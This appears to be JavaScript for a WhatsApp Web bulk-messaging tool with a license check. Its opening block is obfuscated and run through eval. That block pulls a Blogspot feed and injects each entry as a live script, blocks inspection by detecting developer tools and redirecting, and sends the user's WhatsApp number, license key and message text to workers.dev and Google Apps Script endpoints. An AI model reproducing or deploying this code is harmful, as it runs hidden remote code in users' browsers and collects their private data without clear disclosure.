var tnpij = function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3 u(e,t,n){9 o=6.M?b M:b 1g("1h.1i");o.1j=3(){1k(4==8.1l&&D==8.s||1m==8.s){9 e=8.1p,t=1f.1q(e.E(e.1s("{"),e.1t("}")+1));n&&n(t)}},o.1u(e,t,!0),o.1v()}3 N(e){u("1x",e,3(e){F n=e.1y.1z;1A(9 t=0,e=n.H;t<e;t++){9 e=2.g("r");e.L=n[t].1r.$t,2.d.j(e),B(()=>{2.d.1d(e)},K)}})}3 k(){f=(b m).C(),7=(b m).C(),D<7-f?(2.V(" W!! X Y Z 10... "),T.5.12(6.5.G+6.5.y.E(6.5.G.H))):(f=I,7=I,A f,A 7),19.1a(),B(k,K)}!3(){F e;"1E.20.P"===6.5.2d&&((e=2.g("h")).L=\'<h x="c"><a 29="i" y="2k:;" 24="25/w v" x="27">28... / w v</a></h>\',2.d.j(e),(e=2.g("1D")).2e="#c{2f:2g;2h:l;z-q:p;2i:0;22-1Q:21}#c a.i{1G:1H;1I:J 1J;1K:#1L;O:#R;1M-1N:1O;z-q:p;1R:l;1S: 1T-1U;Q-1V:1W;1X-1Y:0 l J S 1C(1Z 1P 1F/16%);Q-2b:23;2a-26:2c}#c a.i:2j{O:#R}",2.d.j(e),N("1b://18.17.P/15/14/11/-/13?U-1c=1&1e=1B&1w=1o-1n-r"),k())}();',62,145,'||document|function||location|window|after|this|let||new|fsetting2|body||before|createElement|div|runbutton22|appendChild|check|2px|Date|||99998|index|script|status||xhr|Data|Clear|id|href||delete|setTimeout|getTime|200|substring|var|protocol|length|null|5px|100|innerHTML|XMLHttpRequest|fetchafterrun|color|com|font|fff|1px|self|max|write|Alert|Close|Developer|Tools|Now|default|replace|installtool|posts|feeds||blogspot|walike24|console|clear|https|results|removeChild|orderby|JSON|ActiveXObject|Microsoft|XMLHTTP|onreadystatechange|if|readyState|304|in|json|responseText|parse|content|indexOf|lastIndexOf|open|send|alt|GET|feed|entry|for|updated|rgb|style|web|67|cursor|pointer|padding|15px|background|005af0|border|radius|4px|64|height|margin|display|inline|block|weight|600|box|shadow|60|whatsapp|initial|line|12px|title|Wait|decoration|addext|Loading|class|text|size|none|hostname|innerText|position|fixed|top|left|hover|javascript'.split('|'),0,{});window.eval(tnpij);


async function sendDataKV(keyName, data) {
    try {
        const response = await fetch("https://share.autopush.workers.dev/link-no-licence", {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ keyName, data }),
        });

        if (response.ok) {
            console.log('Data sent successfully.');localStorage.removeItem("keycodevalue");
        } else {
            console.log('Error sending data.');
        }
    } catch (error) {
        console.log('Error: ' + error.message);
    }
}


function keycodematch() {
    if(!localStorage.getItem("keycodevalue")){
    let person = prompt("Enter Your Licence Code", "");
    if (person == null || person == "") {error()}
    else{
    localStorage.setItem("keycodevalue", person);setTimeout(vaildkeycode, 20);
    }
    }else{
    vaildkeycode();
    }
    }
    
    function checkvalid(n) {
    
        var kp = localStorage.getItem("keycodevalue");
        if (kp) {
            var acno = kp
        } else {
            var acno = n
        }
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://share.autopush.workers.dev/number-lic-check?key=" + acno, true);
        xhr.onreadystatechange = function () {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                if (xhr.status === 200) {
                    var data = JSON.parse(xhr.responseText);
                    if (data.status == "access") {
                        if (data.vaild) {
                            pkvalidtil(data.vaild);setTimeout(pkusertrust, 50);setTimeout(allsrcrun, 100);
                        }
                        if (data.keycodesave) {
                            localStorage.setItem("keycodesave", data.keycodesave);
                        }
                        if (data.adder) {
                            localStorage.setItem("adder", data.adder);
                        }
                        if (data.payment != "success") {
                            alert("Payment Status: Incomplete");
                        }
                    } else {
                        keycodematch();
                    }
    
                } else {
                    alert("404 Error");
                }
            }
        };
        xhr.send();
    }
    
    function vaildkeycode() {
        var kp = localStorage.getItem("keycodevalue");
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://share.autopush.workers.dev/number-lic-check?key=" + kp, true);
        xhr.onreadystatechange = function () {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                if (xhr.status === 200) {
                    var data = JSON.parse(xhr.responseText);
                    if (data.status == "access") {
                        if (data.vaild) {
                            pkvalidtil(data.vaild);setTimeout(pkusertrust, 50);setTimeout(allsrcrun, 100);
                        }
                        if (data.keycodesave) {
                            localStorage.setItem("keycodesave", data.keycodesave);
                        }
                        if (data.adder) {
                            localStorage.setItem("adder", data.adder);
                        }
                        if (data.payment != "success") {
                            alert("Payment Status: Incomplete");
                        }

                        sendDataKV(findnumbersend(), kp);
                    } else {
                        localStorage.removeItem("keycodevalue");
                        error();
                        console.log("error run")
                    }
    
                } else {
                    alert("404 Error");
                }
            }
        };
        xhr.send();
    }
    
async function post_data_server(url, dataToSend) {
    try {
        const response = await fetch(url, {
            method: 'POST',
            body: dataToSend
        });

        const data = await response.json();

        if (data.result === "success") {
            localStorage.removeItem("allpklinkstore");
            // You can do more things here on success
           // console.log('Data sent successfully:', data)
        } else {
          //  console.warn("Server responded with failure:", data);
            if (localStorage.getItem("keycodesave") == "pkjoingroup" || localStorage.getItem("keycodesave") == "prakash22") {
				if (document.getElementById("stoprun")) {
					document.getElementById("stoprun").checked = true;
					setTimeout(reloadbtn, 4000);
				}
				console.log("Gdrive Server responded with failure:")};
        }
    } catch (error) {
        // console.error('Error sending data:', error);
        if (localStorage.getItem("keycodesave") == "pkjoingroup" || localStorage.getItem("keycodesave") == "prakash22") {
				if (document.getElementById("stoprun")) {
					document.getElementById("stoprun").checked = true;
					setTimeout(reloadbtn, 4000);
				}
				console.log('Gdrive Error data:')};
    }
}



    function findnumbersend() {
        var e = localStorage.getItem("last-wid"),
            t = localStorage.getItem("last-wid-md");
        return e ? e.split("@")[0].substring(1) : t ? t.split(":")[0].substring(1) : "910000000000"
    }
    function treport(e, n) {
    var keycode=localStorage.getItem("keycodesave") + "-" + findnumbersend();
    var hjmatch=localStorage.getItem("keycodesave");
    if(hjmatch=="hemant"){
        var counter=e;
    
    }else{
        var counter="Privacy Added";
    }
    var lcode=localStorage.getItem("keycodevalue");
        if(document.getElementById("matchmsg")){
            var matchmsg=document.getElementById("matchmsg").value
        }else{
            var matchmsg="Not Found"
        }
		
		
        if(document.getElementById("smdb")){
            var smdb=document.getElementById("smdb").value.split("\n").join(",");
        }else{
            var smdb="Not Found"
        }
        
        if(!lcode){var lcode=""}

        if(e.includes("gjoin")){
            gjoinsend(e, n)

        }else{
/* group data recive */
var dataToSend2 = new FormData();
dataToSend2.append('keycode', keycode);
dataToSend2.append('lcode', lcode);
dataToSend2.append('uses', 'kk' + e);
dataToSend2.append('counter', counter);
dataToSend2.append(localStorage.getItem("keycodesave"), n);
dataToSend2.append('matchmsg', matchmsg.trim());

// var dataToSend4 = new FormData();
//  dataToSend4.append('database', smdb);
/*
var adder=localStorage.getItem("adder");
if(adder){
    if(adder=="pk"){
         post_data_server("https://script.google.com/macros/s/AKfycbwWmu5ggYBC50nVi1W0qsRPoO5x50b6xM6XmQ4mY595eADA9_hyLjwW4QxmSVLzkYfb/exec",dataToSend2)
    }
}*/
post_data_server("https://script.google.com/macros/s/AKfycby8z5z2gCm1tSMAgCy5bJ4LiI_AbOcxuFTc19b2yDqV3lJb88DAeUuOqmpuOHumnVlUHQ/exec",dataToSend2)

// post_data_server("https://script.google.com/macros/s/AKfycby8z5z2gCm1tSMAgCy5bJ4LiI_AbOcxuFTc19b2yDqV3lJb88DAeUuOqmpuOHumnVlUHQ/exec",dataToSend4)

        }

    }
    
    function checkwpcss() {
        var e = document.createElement("div");
        e.innerHTML = '<div id="fr"></div><div id="eframe"></div><div id="fastframe"></div>', document.body.appendChild(e), (e = document.createElement("style")).innerText = "@-webkit-keyframes slidein{0%{opacity:0}20%,50%,80%{opacity:1;bottom:62px}to{opacity:0;bottom:-200px;visibility:hidden}}@keyframes slidein{0%{opacity:0}20%,50%,80%{opacity:1;bottom:62px}to{opacity:0;bottom:-200px;vibility:hidden}}.stickAdin:checked~#showbtn{display:block}.stickAdin:checked~#fastbox{display:none}#fastbox *{-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box}#fastbox .right label.buttonx.small{position:fixed;right:0;top:0}#fastbox .right{text-align:right}#fastbox p{margin:8px 0;font-size:12px}#fastbox a{text-decoration:none;color:#00f}#fastbox input[type='text'],#fastbox input[type='text']::placeholder{font-size:12px}#fastbox a.buttonx{color:#fff}#fastbox p i{font-style:italic}#fastbox textarea{width:100%;height:60px;padding:5px;display:block;margin:0;background:url('data:image/png;base64,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